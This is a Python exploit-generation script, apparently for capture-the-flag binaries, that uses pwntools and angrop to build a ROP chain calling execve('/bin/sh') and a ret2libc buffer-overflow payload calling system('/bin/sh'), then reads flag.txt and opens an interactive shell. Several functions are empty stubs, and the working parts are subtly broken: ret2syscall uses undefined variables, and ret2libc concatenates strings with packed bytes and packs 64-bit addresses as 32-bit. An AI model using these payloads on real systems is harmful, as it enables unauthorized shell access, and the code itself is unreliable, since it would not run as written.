from typing import Optional
from pwn import *
import angr, angrop
import struct
import config as c


def ret2win(vuln) -> Optional[str]:
    return None # TODO


def ret2system(vuln) -> Optional[str]:
    return None # TODO


def ret2execve(vuln) -> Optional[str]:
    return None # TODO


def ret2syscall(vuln) -> Optional[str]:
    bin_sh = next(e.search(b'/bin/sh'))
    #syscall = p64(e.sym['syscall'])
    print("Using Angrop")
    proj = angr.Project(binary)
    arop = proj.analyses.ROP()
    arop.find_gadgets_single_threaded()
    chain = arop.set_regs(rax=59, rdi=bin_sh, rsi=0, rdx=0)
    exp = padding + chain.payload_str()
    exp += p64(r.find_gadget(['syscall'])[0])
    p.recvuntil(b' >>>')
    p.sendline(exp)
    #sleep(1)
    p.sendline(b'cat flag.txt')
    p.interactive()


def ret2libc(vuln, rip, rsp, binary) -> Optional[str]:
    e = ELF(binary)
    p = process(binary)
    r = ROP(binary)
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    functions = p.libc.functions
    libc_exit = functions['exit']
    libc_system = functions['system']
    bin_sh = next(p.libc.search(b'/bin/sh'))
    
    endian = None
    if e.endian == 'little':
        endian = "<I"
    elif e.endian == 'big':
        endian = ">I"
    else:
        print("What endian is this? " + e.endian)

    payload = ""
    payload += 'A' * rip
    payload += struct.pack(endian, libc_system)
    payload += struct.pack(endian, libc_exit)
    payload += struct.pack(endian, bin_sh)
    p.sendline(payload.encode())


def ropwrite(vuln) -> Optional[str]:
    return None # TODO
